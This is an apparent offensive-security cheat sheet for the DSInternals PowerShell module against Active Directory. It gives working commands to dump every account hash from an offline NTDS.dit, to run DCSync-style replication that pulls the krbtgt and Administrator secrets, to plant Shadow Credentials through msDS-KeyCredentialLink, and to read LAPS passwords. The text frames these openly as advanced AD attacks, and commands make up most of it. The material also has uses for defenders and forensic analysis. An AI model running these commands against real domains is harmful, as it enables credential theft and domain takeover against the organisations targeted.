# 03.11 DSInternals

> Low-level AD internals PowerShell module — read NTDS.dit offline, dump krbtgt, manipulate replication metadata.

## Overview

DSInternals exposes the internals of Active Directory: read NTDS.dit files offline, decode replication metadata, manipulate krbtgt, simulate DCSync, set msDS-KeyCredentialLink (Shadow Credentials), set primary group RID, perform PowerShell-native LDAP queries with specialized filters. Critical for advanced AD attacks and for offline post-mortem analysis of stolen NTDS.dit.

## Steps

- **Step 1** - Install from PowerShell Gallery or GitHub.
- **Step 2** - For offline NTDS analysis, need NTDS.dit + SYSTEM hive.
- **Step 3** - For online queries, run against DC with appropriate creds.

## Commands

### Install

```powershell
Install-Module DSInternals -Scope CurrentUser
Import-Module DSInternals
```

### Offline NTDS dump

```powershell
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -All -DBPath .\NTDS.dit -BootKey $key | Format-Custom
```

### Online DCSync simulation

```powershell
Get-ADReplAccount -All -Server <DC-FQDN> | Out-File ntds_dump.txt
Get-ADReplAccount -SamAccountName krbtgt -Server <DC-FQDN>
```

### Shadow Credentials (msDS-KeyCredentialLink)

```powershell
Set-ADComputer -Identity <TARGET-COMP> -KeyCredentialLink <CERT-BLOB>
# Or via DSInternals:
$key = Get-ADKeyCredentialLink -DistinguishedName 'CN=<USER>,CN=Users,DC=<DOMAIN>'
Set-ADKeyCredentialLink -DistinguishedName 'CN=<USER>,CN=Users,DC=<DOMAIN>' -KeyCredentialLink $newKey
```

### Replicate single account (manual DCSync)

```powershell
Get-ADReplAccount -SamAccountName krbtgt -Server <DC-FQDN>
Get-ADReplAccount -SamAccountName Administrator -Server <DC-FQDN>
```

### Read LAPS passwords

```powershell
Get-ADReplAccount -All -Server <DC-FQDN> | Where-Object { $_.LapsPasswordExpirationTime -ne $null } | Format-Table SamAccountName,LapsPassword
```
